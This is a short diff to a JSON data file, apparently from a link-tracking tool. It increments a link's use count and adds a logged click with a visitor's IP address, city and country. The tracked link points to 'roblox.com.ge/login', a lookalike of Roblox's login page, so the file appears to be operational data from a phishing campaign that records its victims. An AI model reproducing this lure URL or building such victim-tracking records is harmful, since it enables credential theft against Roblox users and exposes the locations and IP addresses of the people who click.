@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1379,
+    "useCount": 1380,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11200,6 +11200,14 @@
         "city": "Naaldwijk",
         "flag": "🇳🇱",
         "countryCode": "NL"
+      },
+      {
+        "timestamp": 1777422942578,
+        "ip": "76.98.79.85",
+        "country": "United States",
+        "city": "Oaklyn",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
